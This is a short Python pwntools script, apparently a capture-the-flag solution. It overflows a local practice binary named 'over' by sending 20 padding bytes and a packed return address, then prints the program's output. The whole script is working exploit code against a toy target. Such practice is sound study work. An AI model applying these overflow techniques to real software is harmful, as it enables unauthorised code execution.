from pwn import *
import sys
import time

io = process('./over')
io.send(cyclic(20) + p64(0x4011b6+5))
io.shutdown('out')
print('Answer: ' + str(io.readall(), 'ascii', errors='replace'))
